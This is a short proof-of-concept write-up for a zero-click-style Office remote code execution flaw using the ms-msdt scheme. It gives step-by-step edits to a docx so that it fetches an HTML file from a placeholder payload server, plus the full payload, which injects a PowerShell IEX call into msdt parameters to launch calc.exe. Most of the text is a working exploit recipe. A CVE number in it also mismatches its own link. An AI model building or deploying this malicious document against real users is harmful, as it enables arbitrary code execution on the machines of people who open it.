# MS-MSDT 0-day Office RCE

MS Office docx files may contain external OLE Object references as HTML files. There is an HTML sceme "ms-msdt:" which invokes the msdt diagnostic tool, what is capable of executing arbitrary code (specified in parameters).

The result is a terrifying attack vector for getting RCE through opening malicious docx files (without using macros).

Here are the steps to build a Proof-of-Concept docx:

1. Open Word (used up-to-date 2019 Pro, 16.0.10386.20017), create a dummy document, insert an (OLE) object (as a Bitmap Image), save it in docx.

2. Edit `word/_rels/document.xml.rels` in the docx structure (it is a plain zip). Modify the XML tag `<Relationship>` with attribute

```
Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
```

and `Target="embeddings/oleObject1.bin"` by changing the `Target` value and adding attribute `TargetMode`:

```
Target = "http://<payload_server>/payload.html!"
TargetMode = "External"
```

Note the Id value (probably it is "rId5").

3. Edit `word/document.xml`. Search for the "<o:OLEObject ..>" tag (with `r:id="rd5"`) and change the attribute from `Type="Embed"` to `Type="Link"` and add the attribute `UpdateMode="OnCall"`.

NOTE: The created malicious docx is almost the same as for [CVE-2021-44444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444).

4. Serve the PoC (calc.exe launcher) html payload with the ms-msdt scheme at `http://<payload_server>/payload.html`:

```
<!doctype html>
<html lang="en">
<body>
<script>
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times
  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
</script>

</body>
</html>
```

Note that the comment line with AAA should be repeated >60 times (for filling up enough space to trigger the payload for some reason).

